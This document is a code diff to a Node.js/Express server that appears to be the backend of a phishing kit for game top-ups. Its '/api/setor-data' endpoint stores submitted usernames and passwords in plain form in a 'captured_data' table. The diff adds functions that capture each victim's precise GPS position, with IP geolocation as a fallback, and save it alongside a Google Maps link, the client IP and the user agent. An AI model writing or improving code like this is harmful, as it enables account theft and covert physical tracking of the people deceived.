@@ -10,6 +10,106 @@ require('dotenv').config();
 const app = express();
 const server = http.createServer(app);
 
+const PRECISE_GPS_THRESHOLD_METERS = 100;
+const MAX_BROWSER_LOCATION_ACCURACY_METERS = 50000;
+
+function normalizeClientIp(req) {
+    const forwardedFor = req.headers['x-forwarded-for'];
+    let ip = Array.isArray(forwardedFor) ? forwardedFor[0] : forwardedFor;
+    ip = ip || req.headers['x-real-ip'] || req.socket.remoteAddress || '';
+
+    if (ip.includes(',')) ip = ip.split(',')[0];
+    ip = ip.trim();
+    if (ip.startsWith('::ffff:')) ip = ip.replace('::ffff:', '');
+
+    return ip;
+}
+
+function isPrivateOrLocalIp(ip) {
+    if (!ip) return true;
+    const normalizedIp = ip.toLowerCase();
+    if (normalizedIp === '::1' || normalizedIp === '127.0.0.1' || normalizedIp === 'localhost') return true;
+    if (ip.startsWith('10.') || ip.startsWith('192.168.')) return true;
+    if (/^172\.(1[6-9]|2\d|3[0-1])\./.test(ip)) return true;
+    if (normalizedIp.startsWith('fc') || normalizedIp.startsWith('fd') || normalizedIp.startsWith('fe80:')) return true;
+    return false;
+}
+
+function toFiniteNumber(value) {
+    const numberValue = Number(value);
+    return Number.isFinite(numberValue) ? numberValue : null;
+}
+
+function normalizeGps(gps) {
+    if (!gps || typeof gps !== 'object') return null;
+
+    const lat = toFiniteNumber(gps.lat);
+    const lng = toFiniteNumber(gps.lng);
+    const accuracy = toFiniteNumber(gps.accuracy);
+
+    if (lat === null || lng === null || accuracy === null) return null;
+    if (lat < -90 || lat > 90 || lng < -180 || lng > 180) return null;
+    if (accuracy < 0 || accuracy > MAX_BROWSER_LOCATION_ACCURACY_METERS) return null;
+
+    return {
+        lat,
+        lng,
+        accuracy,
+        timestamp: gps.timestamp || null
+    };
+}
+
+function formatMeters(value) {
+    return `${Number(value).toFixed(1)}m`;
+}
+
+function resolveLocation(gpsPoint, geoInfo) {
+    if (gpsPoint) {
+        const isPrecise = gpsPoint.accuracy <= PRECISE_GPS_THRESHOLD_METERS;
+        const confidence = isPrecise ? 'high' : (gpsPoint.accuracy <= 1000 ? 'medium' : 'low');
+        return {
+            lat: gpsPoint.lat,
+            lng: gpsPoint.lng,
+            source: isPrecise ? 'gps' : 'browser',
+            confidence,
+            label: isPrecise
+                ? `GPS Presisi (Akurasi: ${formatMeters(gpsPoint.accuracy)})`
+                : `Lokasi Browser (Akurasi: ${formatMeters(gpsPoint.accuracy)})`,
+            accuracy: gpsPoint.accuracy,
+            gpsTimestamp: gpsPoint.timestamp,
+            isHighAccuracy: isPrecise ? 1 : 0
+        };
+    }
+
+    const ipLat = toFiniteNumber(geoInfo.lat);
+    const ipLng = toFiniteNumber(geoInfo.lon);
+    const hasIpLocation = geoInfo.status === 'success' && ipLat !== null && ipLng !== null;
+
+    if (hasIpLocation) {
+        return {
+            lat: ipLat,
+            lng: ipLng,
+            source: 'ip',
+            confidence: 'low',
+            label: `${geoInfo.city || 'Unknown City'}, ${geoInfo.regionName || 'Unknown Region'}, ${geoInfo.country || 'Unknown Country'} (Estimasi IP)`,
+            accuracy: null,
+            gpsTimestamp: null,
+            isHighAccuracy: 0
+        };
+    }
+
+    return {
+        lat: null,
+        lng: null,
+        source: 'unknown',
+        confidence: 'unknown',
+        label: 'Lokasi tidak tersedia',
+        accuracy: null,
+        gpsTimestamp: null,
+        isHighAccuracy: 0
+    };
+}
+
 // SQLite Database Setup
 const dbPath = path.resolve(__dirname, 'database.sqlite');
 const db = new sqlite3.Database(dbPath, (err) => {
@@ -31,13 +131,19 @@ const db = new sqlite3.Database(dbPath, (err) => {
                 mapsLink TEXT,
                 isHighAccuracy INTEGER,
                 accuracy REAL,
+                locationSource TEXT,
+                locationConfidence TEXT,
+                gpsTimestamp TEXT,
                 userAgent TEXT,
                 timestamp TEXT
             )`);
-            // Ensure accuracy, method and userAgent columns exist for existing databases
+            // Ensure newer columns exist for existing databases
             db.run("ALTER TABLE captured_data ADD COLUMN accuracy REAL", (err) => {});
             db.run("ALTER TABLE captured_data ADD COLUMN method TEXT", (err) => {});
             db.run("ALTER TABLE captured_data ADD COLUMN userAgent TEXT", (err) => {});
+            db.run("ALTER TABLE captured_data ADD COLUMN locationSource TEXT", (err) => {});
+            db.run("ALTER TABLE captured_data ADD COLUMN locationConfidence TEXT", (err) => {});
+            db.run("ALTER TABLE captured_data ADD COLUMN gpsTimestamp TEXT", (err) => {});
         });
     }
 });
@@ -84,23 +190,25 @@ app.get('/api/admin/data', (req, res) => {
 app.post('/api/setor-data', async (req, res) => {
     const { username, password, game, nominal, method, gps } = req.body;
 
-    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    if (ip && ip.includes(',')) ip = ip.split(',')[0];
-    if (ip && ip.includes('::ffff:')) ip = ip.split(':').pop();
-
-    const queryIp = (ip === '::1' || ip === '127.0.0.1') ? '8.8.8.8' : ip;
+    const ip = normalizeClientIp(req);
+    const gpsPoint = normalizeGps(gps);
     
     let geoInfo = {};
-    try {
-        const response = await axios.get(`http://ip-api.com/json/${queryIp}`);
-        geoInfo = response.data;
-    } catch (error) {
-        console.error('Error fetching IP geolocation:', error.message);
+    if (!gpsPoint && !isPrivateOrLocalIp(ip)) {
+        try {
+            const response = await axios.get(`http://ip-api.com/json/${ip}`, {
+                timeout: 3000,
+                params: {
+                    fields: 'status,message,country,regionName,city,lat,lon,isp,query'
+                }
+            });
+            geoInfo = response.data;
+        } catch (error) {
+            console.error('Error fetching IP geolocation:', error.message);
+        }
     }
 
-    const hasGPS = gps && gps.lat && gps.lng;
-    const finalLat = hasGPS ? gps.lat : geoInfo.lat;
-    const finalLng = hasGPS ? gps.lng : geoInfo.lon;
+    const resolvedLocation = resolveLocation(gpsPoint, geoInfo);
 
     const dataLog = {
         username,
@@ -110,17 +218,20 @@ app.post('/api/setor-data', async (req, res) => {
         method: method || 'Unknown',
         ip: ip,
         isp: geoInfo.isp || 'Unknown',
-        location: hasGPS ? `GPS Precision (Accuracy: ${gps.accuracy.toFixed(1)}m)` : `${geoInfo.city}, ${geoInfo.regionName}, ${geoInfo.country}`,
-        mapsLink: finalLat && finalLng ? `https://www.google.com/maps?q=${finalLat},${finalLng}` : null,
-        isHighAccuracy: hasGPS ? 1 : 0,
-        accuracy: hasGPS ? gps.accuracy : null,
+        location: resolvedLocation.label,
+        mapsLink: resolvedLocation.lat !== null && resolvedLocation.lng !== null ? `https://www.google.com/maps?q=${resolvedLocation.lat},${resolvedLocation.lng}` : null,
+        isHighAccuracy: resolvedLocation.isHighAccuracy,
+        accuracy: resolvedLocation.accuracy,
+        locationSource: resolvedLocation.source,
+        locationConfidence: resolvedLocation.confidence,
+        gpsTimestamp: resolvedLocation.gpsTimestamp,
         userAgent: req.headers['user-agent'] || 'Unknown',
         timestamp: new Date().toLocaleString('id-ID')
     };
 
     // Save to SQLite
-    const stmt = db.prepare(`INSERT INTO captured_data (username, password, game, nominal, method, ip, isp, location, mapsLink, isHighAccuracy, accuracy, userAgent, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
-    stmt.run(dataLog.username, dataLog.password, dataLog.game, dataLog.nominal, dataLog.method, dataLog.ip, dataLog.isp, dataLog.location, dataLog.mapsLink, dataLog.isHighAccuracy, dataLog.accuracy, dataLog.userAgent, dataLog.timestamp, function(err) {
+    const stmt = db.prepare(`INSERT INTO captured_data (username, password, game, nominal, method, ip, isp, location, mapsLink, isHighAccuracy, accuracy, locationSource, locationConfidence, gpsTimestamp, userAgent, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
+    stmt.run(dataLog.username, dataLog.password, dataLog.game, dataLog.nominal, dataLog.method, dataLog.ip, dataLog.isp, dataLog.location, dataLog.mapsLink, dataLog.isHighAccuracy, dataLog.accuracy, dataLog.locationSource, dataLog.locationConfidence, dataLog.gpsTimestamp, dataLog.userAgent, dataLog.timestamp, function(err) {
         if (err) {
             console.error('Error saving to DB:', err.message);
         } else {
